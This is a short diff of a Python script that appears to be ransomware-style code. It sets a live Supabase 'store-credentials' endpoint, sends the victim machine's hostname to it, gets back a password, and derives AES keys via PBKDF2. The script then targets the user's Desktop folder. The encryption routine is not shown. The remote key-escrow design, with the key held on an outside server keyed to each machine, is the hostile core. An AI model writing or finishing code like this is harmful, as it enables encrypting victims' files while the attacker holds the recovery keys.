@@ -1,10 +1,13 @@
-import os, sys, requests
+import os
+import sys
+import requests
+import platform
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding, hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.backends import default_backend
 
-SERVER_URL = "https://<project-ref>.functions.supabase.co/store-credentials"
+SERVER_URL = "https://qlvtkhpjazvwfnqzoqjr.supabase.co/functions/v1/store-credentials"
 SHARED_KEY = os.getenv("EDGE_SHARED_KEY")
 
 def generate_key(password: str, salt: bytes) -> bytes:
@@ -46,7 +49,7 @@ def store_and_get_password(user_id: str) -> str:
     return r.json()["password"]
 
 if __name__ == "__main__":
-    user_id = os.uname().nodename
+    user_id = platform.node()
     print(f"User ID: {user_id}")
 
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
